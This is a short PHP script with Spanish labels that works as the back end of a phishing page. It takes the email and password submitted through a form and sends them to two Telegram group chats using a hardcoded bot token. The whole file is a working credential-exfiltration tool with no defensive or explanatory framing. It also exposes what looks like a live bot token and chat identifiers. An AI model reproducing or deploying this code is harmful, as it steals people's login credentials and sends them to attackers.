<?php
$botToken = '8086433347:AAGnvXryx26XHvsLnSjbKkaeJYJRxlzhuNE';
$chatIds = [
    '-4980441087', // Grupo 1
    '-4845342373'  // Grupo 2 (REEMPLAZA por el segundo grupo real)
];

$email = $_POST['email'] ?? '';
$password = $_POST['pwd'] ?? '';

if (!empty($email) && !empty($password)) {
    $mensaje = "Correo: <code>" . htmlspecialchars($email) . "</code>\n";
    $mensaje .= "Clave: <code>" . htmlspecialchars($password) . "</code>";

    foreach ($chatIds as $chatId) {
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

        file_get_contents($url, false, stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'content' => http_build_query([
                    'chat_id' => $chatId,
                    'text' => $mensaje,
                    'parse_mode' => 'HTML'
                ])
            ]
        ]));
    }

    echo "OK";
} else {
    echo "Error";
}
?>
